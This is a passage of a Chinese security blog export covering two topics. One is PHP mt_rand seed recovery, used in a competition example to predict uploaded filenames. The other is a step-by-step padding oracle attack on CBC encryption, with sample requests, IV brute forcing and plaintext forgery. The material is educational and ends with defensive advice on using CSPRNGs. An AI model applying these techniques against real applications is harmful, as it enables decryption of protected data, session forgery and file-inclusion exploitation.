punctuation">)</span>    seed <span class="token operator">=</span> 0x499602d2 <span class="token operator">=</span> <span class="token number">1234567890</span> <span class="token punctuation">(</span>PHP <span class="token number">7.1</span>.0+<span class="token punctuation">)</span>    Found <span class="token number">4</span>, trying 0xfe000000 - 0xffffffff, speed <span class="token number">91.9</span> Mseeds/s     Found <span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于是逆推，可能存在多值。</p><p>提供的随机数序列长度越长，逆推越精确。</p><h2 id="3-3-实例分析"><a href="#3-3-实例分析" class="headerlink" title="3.3 实例分析"></a>3.3 实例分析</h2><h3 id="3-3-1-代码审计"><a href="#3-3-1-代码审计" class="headerlink" title="3.3.1 代码审计"></a>3.3.1 代码审计</h3><p>以某国内赛事的题目为例讲解伪随机数安全：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">random_str</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"32"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$set</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"A"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"b"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"B"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"c"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"C"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"d"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"D"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"E"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"f"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"F"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"g"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"G"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"h"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"H"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"i"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"I"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"j"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"J"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"k"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"K"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"l"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"L"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"m"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"M"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"N"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"o"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"O"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"p"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"P"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"q"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Q"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"R"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"s"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"S"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"t"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"T"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"u"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"U"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"v"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"V"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"W"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"x"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"X"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"y"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Y"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"z"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Z"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"3"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"4"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"5"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"6"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"7"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"8"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"9"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token operator">++</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$set</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$str</span> <span class="token operator">.=</span> <span class="token variable">$set</span><span class="token punctuation">[</span><span class="token variable">$ch</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$seed</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ss</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$ss</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SESSION'</span><span class="token punctuation">,</span> <span class="token variable">$hash</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./up104Ds/'</span> <span class="token operator">.</span> <span class="token function">random_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'_'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file-upload-field'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>代码审计</li></ul><blockquote><ol><li><strong>random_str 函数</strong>：这个函数用于生成一个指定长度的随机字符串。它使用了一个包含大小写字母和数字的字符集 <code>$set</code>。通过循环，每次从字符集中随机选择一个字符并拼接到结果字符串 <code>$str</code> 中。</li><li>**session_start()**：启动会话，这是 PHP 中用于管理用户会话的函数。</li><li><strong>$seed</strong>：生成一个随机种子，用于初始化随机数生成器，以确保每次生成的随机数序列都不同。</li><li>**mt_srand($seed)**：使用 <code>$seed</code> 初始化 Mersenne Twister 随机数生成器。</li><li>**$ss = mt_rand()**：使用 Mersenne Twister 算法生成一个随机数。</li><li>**$hash = md5(session_id() . $ss)**：将会话 ID 和随机数 <code>$ss</code> 连接起来，然后使用 MD5 算法生成一个哈希值。</li><li>**setcookie(‘SESSION’, $hash, time() + 3600)**：设置一个名为 ‘SESSION’ 的 cookie，其值为生成的哈希值，有效期为 1 小时（3600 秒）。</li><li><strong>$filename</strong>：构造一个文件名，该文件名由一个随机字符串和上传文件的原始文件名组成，用于保存上传的文件。</li></ol></blockquote><h3 id="3-3-2-目标——预测文件名"><a href="#3-3-2-目标——预测文件名" class="headerlink" title="3.3.2 目标——预测文件名"></a>3.3.2 目标——预测文件名</h3><p>文件名的组成如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">'./up104Ds/'</span> <span class="token builtin class-name">.</span> random_str<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin class-name">.</span> <span class="token string">'_'</span> <span class="token builtin class-name">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file-upload-field'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>./up104Ds/+随机文件名+<span class="token string">"_"</span>+上传时的文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>随机数的生成主要依赖于：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$set</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">.=</span> <span class="token variable">$set</span><span class="token punctuation">[</span><span class="token variable">$ch</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-3-3-解决思路"><a href="#3-3-3-解决思路" class="headerlink" title="3.3.3 解决思路"></a>3.3.3 解决思路</h3><h4 id="1）获取播种后第一次生成的随机数"><a href="#1）获取播种后第一次生成的随机数" class="headerlink" title="1）获取播种后第一次生成的随机数"></a>1）获取播种后第一次生成的随机数</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$seed</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ss</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$ss</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SESSION'</span><span class="token punctuation">,</span> <span class="token variable">$hash</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会话未建立时，session_id()的值为空，则$hash的值为md5(第一个随机数)</p><p>通过破解哈希值，的到第一个随机数：1608834717</p><h4 id="2）推断种子"><a href="#2）推断种子" class="headerlink" title="2）推断种子"></a>2）推断种子</h4><p>此时可以通过php_mt_srand反推随机数种子：</p><blockquote><p>./php_mt_seed 1608834717</p><p>Found 0, trying 335544320 - 369098751, speed 49932190 seeds per second</p><p>seed = 353675865</p></blockquote><h4 id="3）推断随机数序列"><a href="#3）推断随机数序列" class="headerlink" title="3）推断随机数序列"></a>3）推断随机数序列</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">mt <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">353675865</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> mt <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">mt_rand</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./php mt_rand.php<span class="token number">1608834717</span><span class="token number">364052752</span><span class="token number">104617820</span><span class="token number">1855329673</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4）预测文件名"><a href="#4）预测文件名" class="headerlink" title="4）预测文件名"></a>4）预测文件名</h4><p>预测出随机数序列之后，便可以预测出随机文件名的每一位，从而最终获得文件名。</p><p>最终可以绕过随机文件名防护，实现文件包含等漏洞的利用。</p><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>伪随机数生成的安全性对许多应用至关重要，尤其是在密码学领域。为了确保伪随机数的安全性，必须考虑以下几个方面：</p><ol><li><strong>使用加密安全的伪随机数生成器（CSPRNG）</strong>。</li><li><strong>增加种子熵</strong>，避免使用低熵或固定种子。</li><li><strong>定期更新内部状态</strong>，避免周期性输出和回溯攻击。</li><li><strong>选择高质量的算法</strong>，避免使用简单、过时的PRNG。</li></ol><p>在高安全性场景下，建议结合<strong>硬件随机数生成器</strong>和<strong>加密安全算法</strong>，以提供更强的随机性和安全性。</p>]]></content>
      
      
      <categories>
          
          <category> 密码学算法安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学算法安全 </tag>
            
            <tag> 随机数安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>padding oracle攻击</title>
      <link href="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/"/>
      <url>/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="一、CBC模式简介"><a href="#一、CBC模式简介" class="headerlink" title="一、CBC模式简介"></a>一、CBC模式简介</h1><p>CBC（Cipher Block Chaining，密码块链模式）是一种分组密码的加密模式，它通过将每个明文块与前一个密文块进行异或操作后再加密，以确保数据的安全性。</p><h2 id="1-1-CBC加密流程"><a href="#1-1-CBC加密流程" class="headerlink" title="1.1 CBC加密流程"></a>1.1 CBC加密流程</h2><p>在CBC模式中，首先对明文进行分组，每个明文块先与前一个密文块进行异或后，再进行加密。CBC模式下，每个密文块依赖于前面的所有的明文块。</p><p>涉及到的概念：</p><ol><li><strong>初始化向量（IV）</strong>：CBC模式使用一个初始化向量（IV），这是一个随机生成的值，与第一个明文块进行异或操作。IV的作用是为加密过程提供一个随机的起点，确保相同的明文块在不同的加密过程中产生不同的密文块。</li></ol><h3 id="1-1-1-加密流程"><a href="#1-1-1-加密流程" class="headerlink" title="1.1.1 加密流程"></a>1.1.1 加密流程</h3><p>其加密流程示意图如下：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.00.05.png" alt="CBC模式加密流程" style="zoom:50%;"><ul><li>将明文分为固定大小的块（通常是8字节或16字节）。</li><li>第一个明文块与IV进行异或操作。</li><li>异或后的结果通过加密算法（如AES）加密，生成第一个密文块。</li><li>每个后续的明文块都与前一个密文块进行异或操作，然后再加密，生成下一个密文块。</li></ul><p>密文分组3受到明文分组1、明文分组2、明文分组3的共同影响。</p><h3 id="1-1-2-解密流程"><a href="#1-1-2-解密流程" class="headerlink" title="1.1.2 解密流程"></a>1.1.2 解密流程</h3><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.01.51.png" alt="CBC模式解密流程" style="zoom:50%;"><ul><li>将密文分为相同的块大小。</li><li>第一个密文块通过解密算法解密，然后与IV进行异或操作，恢复出第一个明文块。</li><li>每个后续的密文块都先解密，然后与前一个密文块进行异或操作，恢复出原始的明文块。</li></ul><p>与加密过程不同的是名文分组3仅受密文分组2和密文分组3的共同影响。</p><h3 id="1-1-3-填充（Padding）"><a href="#1-1-3-填充（Padding）" class="headerlink" title="1.1.3 填充（Padding）"></a>1.1.3 填充（Padding）</h3><p>分组带来一个问题，就是明文不可能恰好是block的整数倍，对于不能整除剩余的部分数据就涉及到填充操作。</p><p>在加密最后一个不完整的明文块时，需要进行填充以确保块的大小符合加密算法的要求。常见的填充方式有PKCS#5和OneAndZeroes。</p><h4 id="1）PKCS-5："><a href="#1）PKCS-5：" class="headerlink" title="1）PKCS#5："></a>1）PKCS#5：</h4><p>在最后一个block中将不足的Byte数作为Byte值进行填充，缺少n个Byte，就填充n个0x0n，例如最后一个分组（block）缺少3个byte，就填充3个0x03到结尾。在解密时会校验明文的填充是否满足该规则，如果是以N个0x0N结束，则意味着解密操作执行成功，否则解密操作失败。</p><h4 id="2）OneAndZeroes："><a href="#2）OneAndZeroes：" class="headerlink" title="2）OneAndZeroes："></a>2）OneAndZeroes：</h4><p>在最后一个Block中将不足的byte位数以 0x80开头后续全填0x00的方式进行填充，若最后一个Block缺少3byte，则填充：0x80 0x00 0x00。</p><h1 id="二、Padding-Oracle攻击原理"><a href="#二、Padding-Oracle攻击原理" class="headerlink" title="二、Padding Oracle攻击原理"></a>二、Padding Oracle攻击原理</h1><p>这种攻击方式在2011年的Pwnie Rewards中被评为“最具有价值的服务器漏洞”，因为它能够绕过对算法的直接破解，通过旁路攻击的方式被利用。</p><p>核心原理：明文分组和填充，同时应用程序对于填充异常的响应可以作为反馈。</p><h2 id="2-1-利用场景"><a href="#2-1-利用场景" class="headerlink" title="2.1 利用场景"></a>2.1 利用场景</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://www.example.com/decrypt.jsp?data<span class="token operator">=</span>0000000000000000EFC2807233F9D7C097116BB33E813C5E<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当攻击者在篡改data值时会有以下不同的响应：</p><ul><li>如果data值没有被篡改，则解密成功，并且业务校验成功，响应200</li><li>如果data值被篡改，服务端无法完成解密，解密校验失败，则响应500</li><li>如果data值被篡改，但是服务端解密成功，但业务逻辑校验失败，则可能返回200或302等响应码,而不是响应500</li></ul><p>攻击者只需关注解密成功和解密失败的响应即可（第三种属于解密成功的响应），即可完成攻击。</p><h2 id="2-2-破解密文"><a href="#2-2-破解密文" class="headerlink" title="2.2 破解密文"></a>2.2 破解密文</h2><h3 id="2-2-1-核心思路"><a href="#2-2-1-核心思路" class="headerlink" title="2.2.1 核心思路"></a>2.2.1 核心思路</h3><p>攻击者通过修改密文并发送给服务器，观察服务器对不同密文的响应。如果密文的填充正确，服务器会返回一个成功的响应；如果填充不正确，服务器会返回一个错误响应。攻击者利用这种差异性来确定密文的正确填充，从而逐步解密密文或构造出任意明文的合法密文。</p><h3 id="2-2-2-攻击过程"><a href="#2-2-2-攻击过程" class="headerlink" title="2.2.2 攻击过程"></a>2.2.2 攻击过程</h3><p>假设有这样一个应用，请求如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://www.example.com/decrypt.jsp?data<span class="token operator">=</span>7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即client给server提交的参数为<code>7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6</code> 才能请求正常的服务.</p><h4 id="1）内在加解密过程（不为攻击者所知晓）"><a href="#1）内在加解密过程（不为攻击者所知晓）" class="headerlink" title="1）内在加解密过程（不为攻击者所知晓）"></a>1）内在加解密过程（不为攻击者所知晓）</h4><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.03.19.png" alt="IV+密文值" style="zoom:80%;"><p>IV添加在密文的前段，即最前面8个字节。</p><ul><li>加密过程</li></ul><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.26.09.png" alt="加密过程" style="zoom:80%;"><ul><li>解密过程</li></ul><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.27.56.png" alt="解密过程" style="zoom:80%;"><p>值得注意的是，解密之后的最后一个数据块，其结尾应该包含正确的填充序列，如果不满足，加解密程序会返回异常（500）。</p><h4 id="2）攻击者视角破解密文"><a href="#2）攻击者视角破解密文" class="headerlink" title="2）攻击者视角破解密文"></a>2）攻击者视角破解密文</h4><ul><li>IV值置空</li></ul><p>取第一个Block的密文，并将初始化向量置为0，即：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> F8 <span class="token number">51</span> D6 CC <span class="token number">68</span> FC <span class="token number">95</span> <span class="token number">37</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这时的请求和响应：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Request: http://sampleapp/home.jsp?<span class="token environment constant">UID</span><span class="token operator">=</span>0000000000000000F851D6CC68FC9537Response: <span class="token number">500</span> - Internal Server Error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>回复500说明填充异常，原因是它的结尾未包含正确的填充字节：</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.32.04.png" alt="0000000000000000F851D6CC68FC9537解密失败" style="zoom:80%;"><p>如上图所示，在解密之后，数据块的末尾并没有包含正确的填充序列，因此出现了异常。</p><ul><li>接下来尝试爆破，使得最后的填充序列满足<code>n个0xn</code>的条件</li></ul><p>我们将IV加1，并且发送同样密文</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Request: http://sampleapp/home.jsp?<span class="token environment constant">UID</span><span class="token operator">=</span>0000000000000001F851D6CC68FC9537Response: <span class="token number">500</span> - Internal Server Error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.34.03.png" alt="0000000000000001F851D6CC68FC9537解密失败" style="zoom:80%;"><p>重复发送这样的请求，每次将IV的最后一个字节加一（直至<code>0xFF</code>），那么最终我们将会产生一个合法的单字节填充序列（<code>0x01</code>）</p><p>对于可能的256个值中，只有一个值会产生正确的填充字节<code>0x01</code>，遇上这个值的时候，会得到一个不同于其他255个请求的回复结果。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Request: http://sampleapp/home.jsp?<span class="token environment constant">UID</span><span class="token operator">=</span>000000000000003CF851D6CC68FC9537Response: <span class="token number">200</span> OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.36.05.png" alt="000000000000003CF851D6CC68FC9537解密成功" style="zoom:80%;"><ul><li>推断出中间值（Intermediary Value）的最后一个字节（注意中间值攻击者不知道，他是攻击者攻击的目标）</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Intermediary Byte 异或 <span class="token number">0</span>×3C <span class="token operator">==</span> <span class="token number">0</span>×01, Intermediary Byte <span class="token operator">==</span> <span class="token number">0</span>×3C ^ <span class="token number">0</span>×01, Intermediary Byte <span class="token operator">==</span> <span class="token number">0</span>×3D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>重点：第一组密文解密的中间值是一直不变的，同样也是正确的，我们通过构造IV值，使得最后一位填充值满足0x01，符合padding规则，则意味着程序解密成功（当然解密的结果肯定不是原来的明文），通过循环测试的方法，猜解出中间值的最后一位，再利用同样的方式猜解前面的中间值，直到获取到完整的中间值。</p><ul><li>推断出中间值的倒数第二个字节。</li></ul><p>构造填充值为<code>0x02 0x02</code>的场景，即存在2个填充字节，填充值为<code>0x02</code>。</p><p>此时我们已经知道了中间值得最后一位为<code>0x3D</code>,计算出初始向量的最后一位：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x3D xor 0x02 <span class="token operator">=</span> 0x3F<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即初始向量为<code>0000000000000003F</code></p><p>遍历倒数第二个字节从<code>0x00~0xFF</code>，直到响应成功.</p><p>猜解出中间值得后两个字节分别为 <code>0x26 0x3D</code></p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.45.22.png" alt="破解出中间值的倒数第二个字节" style="zoom:80%;"><ul><li>推断出整个中间值</li></ul><p>运用这种技巧，我们可以最终得到解密后的中间值，也就是当整个数据块的填充值都是<code>0x08</code></p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.46.30.png" alt="中间值完整推断" style="zoom:80%;"><ul><li>明文破解</li></ul><p>当第一组密文的中间值猜解成功后，我们将中间值和已知的IV做异或，则得到第一组密文的明文：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x39 0x73 0x23 0x22 0x07 0x6A 0x26 0x3D  异或  0x7B 0x21 0x6A 0x63 0x49 0x51 0x17 0x0F<span class="token operator">=</span> BRIAN<span class="token punctuation">;</span><span class="token number">12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>续破解第二组密文，第二组密文的IV向量是第一组密文，按照上述的逻辑构造第一组密文，即可破解出第二组明文。</p><h3 id="2-2-3-思路总结"><a href="#2-2-3-思路总结" class="headerlink" title="2.2.3 思路总结"></a>2.2.3 思路总结</h3><ul><li>将IV最后一个字节设置为0x1，不断调整IV最后一个字节（0x01-0xff），爆破使得填充规则正确(7byte+0x01)，得到中间值的最后一个字节。</li><li>在得到最后一个字节的中间值后，将IV最后一个字节设置为0x02，计算IV的最后一个字节。</li><li>不断调整IV倒数第二个字节（0x01-0xff），爆破使得填充规则正确（6byte+0x02+0x02），得到倒数第二个字节的中间值。</li><li>依次类推获得整个中间值。</li><li>中间值和IV异或获得明文。</li></ul><h2 id="2-3伪造明文"><a href="#2-3伪造明文" class="headerlink" title="2.3伪造明文"></a>2.3伪造明文</h2><p>通过密文的破解过程，我们已经掌握了中间值（中间值同密文块是绑定的）和IV。</p><p>结合解密的流程，我们可以通过操纵IV来控制（密文块）解密得到的结果。</p><p>如果想要将密文中第一个数据块解密为“TEST”这个值，您可以计算出它所需要的IV值，只要将目标明文与中间值进行异或操作即可</p><p>只要将字符串”TEST”和4个<code>0x04</code>填充字节与中间值异或之后，便可以得到最终的IV，即<code>0×6D，0×36，0×70，0×76，0×03，0×6E，0×22，0×39</code></p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.52.22.png" alt="伪造明文示例" style="zoom:80%;"><p>如何生成长度超过一个数据块的明文，比如要生成”ENCRYPT TEST”</p><p>首先还是将文本拆成数据块，并设置填充字节</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.54.01.png" alt="伪造大于一个块的明文长度" style="zoom:60%;"><p>通过类似的步骤我们可以知道生成TEST0x040x040x040x04的中间值(0xc3 0x60 0xed 0xc9 0x 6d 0xf9 0x90 